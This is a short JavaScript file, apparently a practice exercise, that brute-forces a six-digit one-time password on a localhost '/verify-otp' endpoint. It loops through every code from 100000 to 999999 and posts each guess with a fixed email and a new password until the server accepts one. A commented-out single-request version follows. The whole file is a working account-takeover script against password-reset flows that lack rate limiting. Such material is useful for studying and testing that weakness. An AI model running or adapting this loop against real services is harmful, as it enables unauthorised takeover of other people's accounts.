import axios from "axios";

const hackServer = async () => {
  for (let i = 100000; i < 999999; i++) {
    try {
      console.log(i.toString());
      const res = await axios.post("http://localhost:3000/verify-otp", {
        email: "vishal@gmail.com",
        otp: i.toString(),
        newPassword: "vishal123",
      });

      if (res.status === 200) {
        console.log(`OTP is ${i}`);
        break;
      }
    } catch (e) {
      continue;
    }
  }
};

hackServer();

// const sendRequest = async () => {
//   const res = await axios.post("http://localhost:3000/verify-otp", {
//     email: "vishal@gmail.com",
//     otp: "190",
//     newPassword: "vishal123",
//   });

//   console.log(res.data);
// };

// sendRequest();
